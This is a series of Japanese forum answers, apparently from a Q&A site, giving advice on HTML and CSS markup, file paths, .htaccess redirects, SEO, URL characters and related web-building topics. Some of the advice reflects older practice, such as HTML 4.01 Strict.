javascriptを使ったリンクは認識できません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。JavaScript、Cookie、セッション ID、フレーム、DHTML、Flash などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … )］より 　ディレクトリ構成も関係ありません。 　サイト内の移動リンクがあるとクローラーはサイトをきちんと理解してはくれますが、(それが最初ですが)、、、上位になるか否かはそれとは別です。 　⇒品質に関するガイドライン - 基本方針( http://support.google.com/webmasters/bin/answer. … )
これでいけませんかね。 200「%」と、パーセントにします。 <img src="main.jpg" width="200%" height="200%">
　ドメインは多国語対応になりました。国際化ドメインと呼ばれ、実際にやり取りされるものはPunycode( http://ja.wikipedia.org/wiki/Punycode )でエンコードされています。この処理はブラウザが行います。 　それ以下のPATH_INFOは、URLエンコードされて渡されます。 [例] 　⇒国際化ドメイン名 ( http://ja.wikipedia.org/wiki/%E5%9B%BD%E9%9A%9B% … ) 　/%5%以下--%E5%9B%BD%E9%9A%9B%E5%8C%96%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E5%90%8D--はそのデータですが、URL欄には日本語が表示されているはずです。
私は必ず絶対パスです。 　なぜなら、適用するHTMLがどの階層、どのディレクトリにいても<link>の内容を書き換える必要がまったくないからです。 　ブラウザは、HTMLに書かれているパスを補完してサーバーに再要求します。 　なおスタイルシートだけでなく、サイト全体で使用する画像やスクリプトも絶対パスです。 　逆にそのディレクトリ内のみで使用するものは相対パスです。 / root |-- index.html |-- CSS/ |-- JS/ |-- SSI/ |-- images/ |-- product/ |　　　|-- index.html★ |　　　|-- tools/ |　　　|　　|-- index.html★ |　　　|　　|-- CSS/ |　　　|　　|-- images/ |　　　|-- CSS/ |　　　|-- images/ |　　　|-- SSI/ 　例えばtoolsディレクトリを、他の階層に移動したときに、その内部だけで使用する参照ファイルは一緒に移動したほうが良いですから、絶対パスだとまずいですね。しかし、その階層より上のディレクトリでも使われているものは絶対パスじゃないと大変。 　これらは、どちらがよいかと言う問題ではなく、それしか選択肢がないことが多いですね。 　ただし、テスト用のローカルサーバーを持っていないときは、相対パスで書かないとテストできませんね。私は、abc.comというリモートのサーバーがあれば、abc.com.localというローカルサーバー経由でテストします。 　テキストエディタ(EmEditor)で作成しているときに、テストボタンでfirefoxで表示し、firefoxからは、Server Switcher( https://addons.mozilla.jp/firefox/details/2409 )で、ローカルホストに、ローカルホストからリモートホストに切り替えられるわうにしています。
なんで詳しくなりたいのか、というのがポイントかもしれません。 情報は図書館にもネット上にもあります。ただです。 時間は有限ですが、慣れればスムーズに覚えられます。 動画編集と掲示板のプログラム、PCの修理は全く異なるスキルです。 まあ、いずれにせよ検索力強化でいいんじゃないでしょうか。 やりたいことをやるために、いろいろ調べて失敗したら調べて、ってやれば一個何かができます。 そうしたら他のこともできるようになってるかもしれません。 ただ、ヤル気があればです。 なので、なんで詳しくなりたいのかというのが大事になります。
要約していってしまえば、マークアップ言語は文書の記述方法にすぎません。 つまり、マークアップ言語で作れるのは、文書です。 プログラム言語で作れるのは、言葉の通りプログラムです。 だからまったく違うものですね。 ご参考まで。
div.figureのwidth:height:はautoのほうが良いでしょう。 div.figure{ float:right; width:auto;height:auto; padding:0; position:relative; overflow:hidden; margin:0.5em 1em; } div.figure p{margin:0;} div.figure p.figcaption{ background-color:rgba(0,0,0,0.6); color:white; position:absolute; bottom:0; width:100%; padding:5px; font-size:0.8em; text-indent:1em; }
　googleの検索オプションを使えばよいのでは？ggogleがそのサイトのインデックスを持っている必要があります。ブラウザには、［SearchWP( https://addons.mozilla.jp/firefox/details/376 )］とかを入れておくとか。 　もしくは、CGIなどプログラムを作ってください。サーバーでソケット通信などが許可されている必要があるので、サーバーの規定を確認してください。googleのオプションを指定するHTMLを出力させるほうがよいかも・・ 1)ソケット通信で指定されたサイトのデーターを取得してくる。 2)HTMLを解析して文章を取り出し、kakasi,chasenなどとnamazuを組み合わせて解析する。 3)HTMLを出力する。 　という形になるでしょう。とっても古い有名なツールばかりですので・・
Webデザイナーでない限りは、素敵なホームページを作るのは、 困難ですよ。 無料のテンプレートでは、テンプレートパーティを おすすめします。 flash技術が、なくてもスライドショーにも 出来るのが、javascriptこれは、触れませんが、 HTMLとCSSでとても素晴らしいホームページが、 出来ます。 　どうしても自力で作成したいのでしたら、 無料のトレタマやドットインストールで教わって下さい。 質問は、出来ませんのでわからないことが、 あれば私が、こちらのコーナーで教えます。 参考URL：http://dotinstall.com/
#1です（お礼/補足拝見済み）　なんでコピペで間違うんだろう？・・・ RewriteEngine on RewriteCond %{HTTP_HOST} ^www\.○○○\.jp RewriteRule ^(.*) http://○○○.jp/$1 [R=301,L] RewriteCond %{THE_REQUEST} ^.*/index.html RewriteRule ^(.*)index.html$ http://○○○.jp/$1 [R=301,L] 最終行は改行。 タイムラグが発生する事もある。 Options +FollowSymLinksが必要か不要か？ そもそもindex.htmlなの？って話・・・　下層にも.htaccessがあるとか・・・
<script language="JavaScript" type="text/JavaScript"> <!-- function addBookmark(title,url) { if (window.sidebar) { window.sidebar.addPanel(title, url,""); } else if( document.all ) { window.external.AddFavorite( url, title); } else if( window.opera && window.print ) { return true; } } //--> </script> <head>と</head>の間に記述するJavascriptですね。 私もこちらのホームページでコピーを試してみましたが、 本来このような書き方でなくてスライド式のテーブルで記述して 下さるので不親切なホームページですね。 対策方法は、わかりませんが、ご自分でjavascriptを勉強するのも良いものです。 無料のドットインストールでもしよろしければ勉強してみて下さい。 参考URL：http://dotinstall.com/
ということは大多数のブラウザではだめと言うことかな。 まず、標準モードで起動するようHTMLを直しましょう。 お勧めは、もちろんHTML4.01strict 　⇒Another HTML-lint 5 ( http://www.htmllint.net/en/html-lint/htmllint.ht … ) でDATAタブをクリックしてソースを直します。 ついで、DOCTYPEスイッチで標準モードで起動するよう記述する。 あとは、普通にTABLEを書く <table summary="test" border="1"> 　<thead> 　　<tr> 　・・・ 　　</tr> 　</tbody> 　<tfoot> ・・ 　</tfoot> 　<tbody> 　・・・ 　</tbody> </table> 　あとはスタイルシートで印刷用スタイルシートを書きましょう。 @media screen{} ないし <style type="text/css" media="screen"> table{font-size:10.5pt;line-height:1.6em;border-collapse:collapse;border:solid 1pt black;} table th,table td{border:solid 0.75pt gray;} ・・ 　長大な表の場合、必ずthead,(tfoot)を書いておきましょう。各ページに印刷されます。 　印刷用は、ptなどを使ってきちんとデザインしましょう。 　印刷が想定される場合は、きちんとウェブ標準で作成してスタイルシートでデザインしましょう。
PCサイトとスマホサイトの区別は、基本的にサーバサイドフレームワーク（Java StrutsやASP.NET MVC、Cake phpなど）で行います。 ユーザエージェント、デバイスインフォメーション等の項目を判定しますが、これらのサーバサイド環境では、「生の」ユーザエージェント文字列を扱わなくていいよう、ライブラリ化されています。 また、「グローバルフィルタ」といって、いちいち記述しなくても、指定されたディレクトリ以下へのアクセスで自動的に判定をかけることができ、非常に使いやすいものです。 以前は"iPhone"や"Android"のようなUA文字列で一律に「スマホ」判定を行っていましたが、現在はタブレットの登場や、スマートフォンの高解像度化で、PC用ページとスマホ用ページのどちらを見せるか、という判定基準が難しくなっています。 ご提示のサイトの例では、「スマートフォン」デバイスで高解像度タイプの場合に、「あんたどっち見たいんだ？」といったような選択肢を出しているのだと思います。 なので、 ・「グローバルフィルタ」（フレームワークによって読み方が違います）でユーザエージェントとデバイスを判定。 ・そのデバイスが明らかにターゲットデバイスと異なっている場合は、ルーティングを書き変えて別サイトに誘導（スマホ -> PC、PC -> スマホ）。 ・一部のAndroidデバイスのように、解像度判定だけでターゲット判定できない場合は、別デバイス用サイトへの入り口を提示してあげるのがプロっぽい方法です。 あ、CSS3だけで全デバイスに対応するなんて夢みたいな話が涌いてますが、真に受けないように。 そもそもデバイスの情報表示能力や、CSS3ブラウザ間の互換性すら全く取れていない状況で、そんなスキームは話になりません。
いまどき、transitinalはさすがに古いのでstrictで・・ 　⇒HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　またその文書宣言では、互換モードで表示されるためブラウザ間の表示誤差に悩まされることになります。 　⇒DOCTYPEスイッチ－HTMLの基本( http://www.htmq.com/htmlkihon/302.shtml ) 様々な方法が思いつきますが、できるだけオリジナルを生かして書き直すと・・ 注)見出しtitleですから、divではなく<h1></h1>で括るべきです。 　DIVは他に適切な要素がないときの最後の手段です。そのときも「文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」にidやclassをつけます。 ⇒Authors are strongly encouraged to view the div element as an element of last resort( http://www.w3.org/TR/html5/grouping-content.html … ) ★Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) ★W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … ) で検証済み タブは＿に置換してあるので戻すこと。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.header h1{ font-size:50px;line-height:50px;text-align:center; height:100px;padding-bottom:25px;margin:0; position:relative;top:-25px; } div.header h1 img{position:relative;top:25px;margin:0 10px} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1><img src="http://pic.prepics-cdn.com/sugarcherry/21910244. … width="100" height="100" alt="">タイトル<img src="http://pic.prepics-cdn.com/sugarcherry/21910244. … width="100" height="100" alt=""></h1> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-12</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html> なお本来なら、 <h1>タイトル</h1> とだけ書いておいて、 h1:before{content:url();} h1:after{content:url();} で画像をスタイルシートで追加するべきでしょう。画像がコンテンツに関係ないので
最大の原因は利用者がHTMLやCSSを知らないからですよ。 知ってればあんな汚いソースにはなりません。ただ、知ってればテキストエディタで作成したほうが断然早いのでツールは使わない・・・ 『HTMLエディタで作成するシンプルなコードはSEO（検索エンジン最適化）にも効果的であることから( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … )』 　先刻回答したのですが 　⇒FireWorksで画像をTABLE化　でもズレる - ホームページ作成ソフト - 教えて！goo( http://oshiete.goo.ne.jp/qa/7987606.html ) 　のようなソースはツールを使う必要はないでしょう。数年後に誰かが内容を変更する役目をもらっても簡単に修正できるでしょう。もちろんデザインなんて、マルッキシ変更することもできますよね。スマホ用、印刷用とHTMLは弄らずにスタイルシートだけ用意するとか・・ 　もちろんビルダーを使っても同じソースを書けますが、わざわざ使わない。だから、ツールを使うとソースが汚くなると言うことでしょう。その汚さの程度はHTMLやCSSの知識に反比例する。
＞AとBはファイル名なのでしょうか。 　えっ？どちらの？ a[href="B.html#A"]{background-color:yellow;} 　　B.html↑　　　↑#A 　　ファイル名　　　ページ内ターゲット 　単純にひとつのファイルで済ましているだけです。別ファイルでも構いません。 　ご存知だと思いますが、これは要素セレクタでhref属性の値がB.html#Aであるa要素と言う意味です。[class~="main"]だとclassセレクタとまったく同じで半角スペースで区切られたclass属性の値リストのひとつが一致、[lang|=en]だと-で区切られた値のリストのひとつに一致。 a[href="B.html#A"]{background-color:yellow;} 　詳細度は、この場合0011です。 とりあえず、No.1の回答どおりに試すこと。 　framesetのDTDはframesetで、A.htmlのDTDはtransitinal、B.htmlはstrictになっています。 　
ulとolは、順不同リストと序列リストです。意味がまったく異なります。 どのようにデザインするかとは切り離して、そのリストの項目の意味からマークアップは判断すべきです。 　⇒2.4.1 構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　これは、HTMLを作成する最も基本的な部分です。どちらを使うべきかは、あなたでないとわかりません。 ＞この自動的につく記号は決められたもの以外 　スタイルシートで用意されているのは disc | circle | square | decimal | decimal-leading-zero | lower-roman | upper-roman | lower-greek | lower-latin | upper-latin | armenian | georgian | lower-alpha | upper-alpha | none | inherit です。それぞれは調べてください。 　⇒'list-style-type'( http://www.w3.org/TR/CSS2/generate.html#lists ) CSS2にあった"hebrew", "cjk-ideographic", "hiragana", "katakana", "hiragana-iroha", "katakana-iroha"はCSS2.1で削除されました。 　スタイルシートで、画像を指定する場合ulだとlist-style-imageで指定できます。 　olのように、何回目かによって画像を変更していく場合は、:before(擬似クラス要素)と、contentプロパティ、countを組み合わせます。この場合は画像ではなく、何章何項のように加えることも良く行われています。 <div class="section"> 　<h2>HTML<h2> 　<div class="section"> 　　<h3>HTMLの歴史</h3> 　　<div class="section"> 　　　<h4>CERN</h4> 　　　<h4>SGML</h4> ・・・という文書構造に対して 第１章 HTML 　第１章　1項 HTMLの歴史 　　第１章　1項 --1 CERN 　　第１章　1項 --2 SGML なんて・・・もちろん画像でもOK
私も2台目追加が良いと思いますよ。作業用とプレビュー用でモニタを分けるだけでも随分違います。 RDT232とU2913WMに関してですが、解像度は同じなのでそれぞれのページで表示面積の違いを確認しした所U2913が少し大きいようですね。なので仮に導入すると現状より文字が少し大きくなります。 U2713HMを導入した場合には文字が90%ぐらいの大きさになり、小さくなりますね。 ＞例えば1920*1080で使うと決めた場合、デルの29インチと27インチのモニターの価格が同じなので、 29インチの方が良いですか？ 解像度が同じならコストパフォーマンスを考慮して23インチ or 24インチの方が良いと思います。 1万5千円程度のものです。2台で足りないならまた追加して3台にします。 買うときはそれぞれ別のメーカーにしておけば、普段ユーザーがどういう色で見ているかチェックすることもできます。 モニターを買う場合、コストパフォーマンス重視で1万5千円程度の23インチIPS or 24インチのモニタにするか、AdobeRGBが90%以上表示できるハイエンドモニタのどちらかをオススメします。 ２～５万クラスのモニタは1万5千円のモニタにブランド料が載っているだけなので性能が変わりません。 U2913WMは実のところ色表現に置いて致命的です。はっきり言いますと制作では値段なりの価値がありません。 スペックにsRGB99%対応と書いてありますが、sRGBは100%対応が当たり前なので。
読み込み時間を０にすれば、ページ読み込み前の状態が表示されなくなりますので、 隠し<iframe>に表示したいページをあらかじめ読み込んでおき、 リンクをクリックした時に、JavaScriptでその隠しておいた<iframe>と、既に表示されている<iframe>を入れ替えるのはどうでしょうか。 例えば、 <iframe src="page1.html"></iframe> <iframe src="page2.html" style="display:none"></iframe> と、隣り合わせにして片方を隠しているのを、 <iframe src="page1.html" style="display:none"></iframe> <iframe src="page2.html"></iframe> 隠す方を入れ替えると、フレームページが切り替わったように見えると思います。 キャッシュに頼ってもいいのですが、サーバーの設定やブラウザの設定に影響することがあります。
すみません、ちょっと手抜きしすぎて分かりづらかったですね おっしゃるとおりjavascriptを利用する処理です。 ちょこっときちんと書くとこんな感じ （コメントアウトなどは省略してあります） <html> <head> <title>test<title> <script type="text/javascript"> location.href="http://www.yahoo.co.jp"; </script> </head> <body> <p> なんたらかんたら </p> </body> </html> ちなみにbodyのonloadに記述するのも基本的にはjavascriptの仕様です。 前回も書きましたがjavascriptで書かれたものはユーザーの環境によっては （onloadに書こうが）かならずしもきちんと動きませんので注意が必要です どうしても飛ばしたいならbodyの中にも、「うまくとばなかったらここをクリック」 的なリンクを作ってやるのがアクセシビリティの基本です
＞完全に好みの問題のみということでしょうか。 　いえ、完全に作業効率の関係です。(^^)いくら好きでも作業効率が悪けりゃ使いません。 [例]私はテスト用にローカルサーバ持ってますので ・サイトマップ(各ページ共通)はルートから絶対パス ・全体で使用する画像・スタイルシートなどはルートからの絶対パス ・各ディレクトリ内で使用する画像やスタイルシートは相対パス 　ディレクトリごと他の場所や階層に移動してもよいので ですかね。
>width指定数値が無視されているように見えるのですが、IEの機能なのであればどのような仕様になっているのか教えてください。 IE以外のブラウザでもズレますよ。 原因は、大きく分けて2つかな。 1つは、ヘッダー部分とデータ部分で列数が違っているということ。 ヘッダー部分は16列あるのですが、データ部分は15列しかないので、その分のズレが発生しています。 2つ目は、ヘッダー部分とデータ部分でCELLSPACINGの値が違うということ。 CELLSPACINGの値というのは、テーブルの枠部分の太さを決めていますが、ヘッダー部では太さ0、データ部ではデフォルト値(太さ2)になっています。 この違いによって、ブラウザの表示領域の広さによっては微妙なズレが発生します。 >widthで指定したとおりに表示させるにはどうしたらよいのか ヘッダー部の左端の列の幅を固定値にして、同じ幅の列をデータ部の左端に追加すればいい。 それだけで大きなズレはほぼ解消するはず。 あとは、CELLSPACINGの値も揃えれば完璧だと思いますが、CELLSPACINGによるズレは微妙なものですし無視してもいいかな。
＞（このように表示させたいのです） 　tableの描画アルゴリズムで幅に収まらない場合は折り返すことになっています。 これは、様々なディスプレイのことを考えて定められています。 　⇒11.3 視覚系ユーザエージェントによる表の整形( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　とても良く工夫されています。 　よって、本当は幅を指定しないほうが良いのですが・・ウィンドウ幅やフォントサイズを変えて(Ctrl+＋)試されたらわかるように絶対にそのほうが良いです。 　また、tableを使う限り、overflow:hiddenは使えません。 　　　　^^^^^^^^^^^^^^^^^^ 　が回帰をウを防ぐ方法だけは示しておきます。 1) ブラウザの描画アルゴリズムを止めます。 white-space:プロパティを指定します。とりうる値は normal｜pre｜nowrap｜pre-wrap｜pre-line｜inherit 　です。 normal:標準の折り返し方法(半角スペース・改行ともひとつにまとめられる) pre: HTMLで言うところのpreと同じ(半角スペースや改行もそのまま) nowrap: 半角スペースはひとつにまとめられた上で改行を禁止 (pre-wrap):preと同様空白文字は消されませんが、行ボックスの端まで行くと自動的な改行がされます。 (pre-line):上記に加えて、ソース内の改行も有効です。 inherit: 継承(親の指定を引き継ぐ) ()の値は、CSS2.1で追加 　よって、 table[summary="List"] tbody tr td:nth-child(2), table[summary="List"] tbody tr td:nth-child(3){white-space:nowrap;} 　で改行はなくなります。 ※ table[summary="List"] tbody tr td{white-space:nowrap;} 　でtbody内のすべてのtdについて改行が禁止されます。これがベストです。セル幅は指定しない!!!(内容によってtableの幅全体が伸縮します。) 　なお、どうしてもにこだわるのでしたら、tableではなくリストでマークアップしてdisplay:inline-block、最悪floatで並べるしかないでしょう。
補足です。 　tableは、ブラウザのでファルトは分離ボーダーモデルとセル内に余白を置くのがデフォルトですから、tableで画像を配置するとセル間に隙間が開きます。HTMLでいうとcellspacingです。cellpaddingのいずれも0にして、隙間が開く理由は、改行やタブの影響ではないかと思います。 　No.2の回答のtableの属性で、cellpadding="0" cellspace="0"を指定すればスタイルシートで指定しなくても隙間はなくなるはずです。vertical-alignは関係ありません。 　また、cellpadding="1" cellspace="1"を指定していても、スタイルシートでの指定が優先されますから、スタイルシートで上書きできます。 　⇒カスケード処理の順序（Cascading order） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )
No.3です。 HTML5では、<br/>も許容されることになりました。 ただし、これは空要素や外部要素だけで、内容がないからと言って<p />とは書けません。また<br></br>もダメです。 　しかし、HTML5では、XML構文で書くことが出来ますが、その場合は<br></br>と書けます。
世界標準は、UTF-8です。3byteで構成された、世界標準の文字コードです。 ＷＥＢでは、ＵＴＦ-8で、記述することが、常識です。 どのブラウザでも、正しく表示されます。 ほかにも、ＵＴＦ-16、UTF-32などもありますが、現在は、UTF-8が基準です。
<div style="text-align:center;font-size:1.5;">test1</div> <div style="font-size:3.0">test2</div> スタイルシートの記述間違いです。 ％以外にも、いろいろな記述方法があります。 <body>内にCSSを書くことは、ソールが読みにくくなるので、外部ＣＳＳに記述し、読みこむことを、お勧めします。 .text1{font-size:1.5;lineheight:1.5;} .text2{font-siz:3em;lineheight:1.6;} などと記述して、<p class="text1">test1</p>と、記述した方が、ソースがきれいだと思います。 http://www.nanden.asia/test3/test.zip 参考URL：http://www.nanden.asia/test3/test.html
英語は英語(アルファベット)で記述すれば、そのまま英文のはずですが?? 　質問の意図がつかめません。 ただ、<span lang="en-US">This is a pen."</span>と英語であることをブラウザに教えることは出来ます。
URL Standard に従い URL = URI + IRI の総称として扱いますが、 URL 自体に長さの制約はありません。すでに回答にあるようにアプリケーションごとに実際的な制約が加えられる可能性と、またスキームごとの制約、そしてスキーマごとの制約の可能性があります（うーん、ややこしい）。 スキームごとの制約とは、例えば data: スキーム（RFC 2397）。これはリソース自体を文字列化して URL にしてしまおうという大胆なものですが、リソースが大きくなれば文字列も膨大なものになってしまいます。しかも、HTML 2.0～4.0 まではタグ内に書ける文字数にも制約がありましたので（1024～65535）、<a href="data:...."> の中に納まるように考えてね、という注意書きがあります。同じようなものには javascript: スキームもありますね。 スキーマごとの制約とは、これはどちらかと言えば XML の話になりますが（将来的には JSON もかな）、スキーマを使って「ここの URL は何文字以内でないとダメ」と指定することができます。まあ、この方法は分かりやすいでしょう。 そういうわけで、URL 自体の長さに制約はありませんが、安全のために制約を与えることも可能ですし、アプリケーションの限界のために制約が設けられている可能性もあります。 --- ちなみに、パスはリソースの階層的表現、クエリはリソースの非階層的表現、フラグメントはリソースの内部表現です。そういうつもりで使い分けてみて下さい。
御提示のサイトをよく見れば（↓）にあります。 　http://www.htmq.com/style/visibility.shtml どこかのサイトに出ているから準拠している/していないと考えるよりも、おおもとで調べるのがよろしいかと。 http://www.w3.org/standards/webdesign/htmlcss
IEでソースを見る訪問者は居ないでしょうね・・・ Firefoxで見ればよい話。 どうしても自分で見たいならIEのソースビューアーの既定を変更すればよいです。 または、Shift-JISにするとか。
基本的には 　⇒( http://jbpe.tripod.com/rfcj/rfc2396.ej.sjis.txt ) 下記サイトに整理してまとめてあります。 　⇒URLに使える文字 URLに使えない文字 - プログラマのチラシの裏( http://kanonji.blog4.fc2.com/blog-entry-138.html ) 　ですが、アルファベット大文字小文字と数字、必要なら -　_　.　!　~　*　'　(　) 　です。まあ、-_()というところかな。Windowsで特別な意味を持ってしまうことがあるので 　\は使えません。日本語では円マークですが、これは他の言語では＼の半角を意味します。 　フォルダー名、ディレクトリ名になりますから、自身が分かりやすいようアルファベット大小と-　_　(　)を使いましょう。 　なお、1,000ページもを作成するといっても実際にはPATH_INFOでの管理になると思います。　
下の皆さんがおっしゃる通りで、メモリを4GB以上、できれば8GBにすることが解決策ですね。 32bitでも、5.5GBをRAMDISKとして使って、一時ファイルや設定ファイルの類を置くことでSWAPを減らして快適に使えます。 しかし、同時に考慮する点がもう一つ。 Dreamweaver で読み込みが遅いということは、作成したサイトのブラウザ表示も遅いのではありませんか? もしそうだとすると、コードを簡素化する努力が必要だと思います。 装飾に凝るあまりに無駄なdiv を使っていませんか? テーブルの中にテーブルを入れるネストと言う行為をしていませんか? class にすべきところで一意セレクタのid を多用していませんか？
掛かっているCSSのどこかに overflow: hidden; が入っているとそうなる。 見つけて記述を外すかそのスタイルの外に出す。 初心者さんでCSSがわかんなければ、もう <body>のすぐ下にボタンを記述するとかいろんなところにボタンの配置場所を変えてみて動作を調べたりするとなんか解決できるでしょう。
下の皆さんがおっしゃる通りで、まずはgoogle に登録です。 ユニーク(ほかの人があまり使わないよう)なサイト名ですと、早ければ登録数時間後からヒットします。 ただし、これでヒットするのはサイト名と、description の記載内容にほぼ一致した場合ぐらいだと思っておいてください。 では、キーワード検索でヒットするようになるにはどうするか? これは、「世間が必要とする情報」を発信することです。 あなたが作成したサイトを閲覧した方の多くが、「見て良かった」「思わぬ得をした」と思えるようなサイトを作るのです。 例えば、特産品を扱うショッピングサイトを作るとしましょう。この時に商売だけしか考えないようではだめ。その商品が何故その土地の特産品になったのかの背景だとか、その土地の観光ガイド、民話などを紹介するのです。 さいごに、文字はちゃんと文字として入力していますよね？ 検索ロボットは文字を拾うので、むやみに画像化することは避けましょう。
専用にパソコンを用意されているなら気にしないでください。 私は、色々細工してますので・・ まず、apacheでCGIが動作するように、該当するモジュールのコメントアウトを外すこと CGI用のディレクトリ(Windowsだとホルダー)に、option　+ExecCGIを追加すること。デフォルトではnoneになっている。 同様に #AddHandler cgi-script .cgi のコメントも外します。 aliasで、パスを通すこと ただし、perlは導入済み 単純にはそれだけになります。 もうひとつは、mod_perlを使用する方法ですが、シェル(Windowsの場合コマンドプロンプト)でperlのチェックをすることができないのと、メモリーを結構消費する欠点はありますが、動作は格段と速くなります。 　こちらが簡潔でよくまとめられています。 　⇒ApacheでCGI( http://www5.plala.or.jp/vaio0630/apache/apache_c … ) 　私はローカルサーバーはFreeBSD上ですが、基本的には大差ないと思います。
サイト内に他サイトへのリンクがあっても意味ないです。 　一般的に、クローラーが価値を認めているのは、まず、<a href="http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … リンクとアンカーの概説</a>を読んでください。というような、あるページ(A)の文中のリンクです。その場合、 1) それが本文と関係あるかないか、 2) そのページ(A)が多くのサイトからリンクされている評価のあるページか？ などが基準になります。 　(1)については、そのページが文書構造をきちんと示すマークアップがしてあって、クローラーにそのページの内容が正確に把握できることが前提です。---これが検索エンジン(SEO)--です。本文なら<div class="section"></div>とか・・ 　(2)については、そのページ自体の評価に関わります。 　リンク集は、次のように考えると良いです。 ★「そのテーマへの記述が一ページである場合」は、そのページの記述内にリンク集へのリンクがある場合は、ページの最後にまとめてリンク集を書く。 　[例]Wikiのページの一番下に書かれているリンク集--いわゆる参考文献の一覧--- ★「そのテーマに関して複数のページにまたがっている場合」は付属文書--appendix--としてまとめる。 　いずれも、本文中に直接関連する情報へ直接リンクするのが本来ですが、それでは情報が足りない場合にまとめます。 　ここまではリンクする側の問題です。注意点は ※ 本文中の記述に直接関係ないサイトへのリンクが多いと、リンクプログラムと判断されることがある。 　　これは記事を読んでいる人の立場になれば分かるでしょう。 　基本的にリンク集は、利用者の役に立つリンク集であるかを基に作成すれば良いです。検索エンジンのためではありません。 　私は、よく「相互リンクをしたい」というメールを受け取りますが、次のように説明して原則お断りしています。 　貴サイトのページを訪問される方にとって、その記事内で役に立つと判断されればリンクは自由です。連絡も不要です。また必要ならページ内アンカーを設けますからご連絡ください。 　貴サイトにつきましては、貴サイトを拝見させていただいて、貴サイトへのリンクが利用者に価値があると判断した場合には、リンクさせていただくかも知れません。 とお答えしています。 　⇒ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプの品質のガイドライン( http://support.google.com/webmasters/bin/answer. … ) 　を読まれると良いでしょう。ここと、ここのリンクに書いてあることがすべてです。一言で言うと 『検索エンジンではなく、ユーザーの利便性を最優先に考慮してページを作成する。』 と、文書構造が分かるようにきちんとマークアップしましょう。
URLが同じなのでは？ URLの後に適当な（動作に影響のない）PATH_INFOとかQUERY_STRINGSを付加してみたら？
大文字・小文字を使い分ける必要がない！とかかれていませんか？・・・ 以前、ＨＴＭＬでは、タグは、大文字、xhtmでは、小文字で書くことが推奨されていましたが、どちらで書いても問題ないことが、明らかにされていました。 ＨＴＭＬ５でも、まったく同じことがいえるのでは？・・・ 私は、タグはすべて小文字で書いています。 titleでも、ＴＩＴＬＥでも、Ｗ３ＣのValidatio(http://validator.w3.org/)も通ります。
＞divでこの用法がいけないというのなら、他の方法はないでしょうか。 　いまは、まだ文書構造とプレゼンテーションの分離という大事な部分が身についていないため、ここで壁にぶつかっているだけだと思います。 　本来なら、今の段階では、プレゼンテーションは一切考えずに、文書構造だけをマークアップすることに専念すべきなのです。自分が検索エンジンや、メンテナンスを頼まれた外部業者の対場になって考えると良いでしょう。 　かゆいところに手が届かない回答になってしまうのは、実は、あなたのHTMLの文書構造が分からないので、具体的なスタイルシートやHTMLの書き方を示せないのです。 　以前、の回答例ですが 　⇒左側に設置したバナーの縦の長さを小さくしたいです - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7953410.html ) のNo.1での回答で示したHTMLは、ある会社の製品紹介ページを想定して書いたものですが、ソースをご覧になると分かるように、どこに何が書いてあるか誰でもわかると思います。それが分かるようにclass名をつけています。デザインに使うか使わないかは関係なくclass名が付けてあります。それ以外は、HTML5の新しい要素名を参考にheader,section,footer,asideのclass名が付けてあります。 　このHTMLに対するスタイルシートは、 　⇒左側のバナーの背景色を、任意の色に変更したいです。 - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7953557.html ) 　のNo.2にあります。「左側に設置したバナーの縦の長さを小さくしたいです - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7953410.html )」の指示通りに画像を用意してテストしてみてください。 　このように文書構造とプレゼンテーションが分けてあると、背景だけでなくデザインをまったく変えることも容易に出来るようになるのです。
よく理解できないのですが、下記参照URLのようにするということですか？・・・ 正解であれば、http://www.nanden.asia/test2/test2.zip　を、お持ち帰りください。 参考URL：http://www.nanden.asia/test2/temp.html
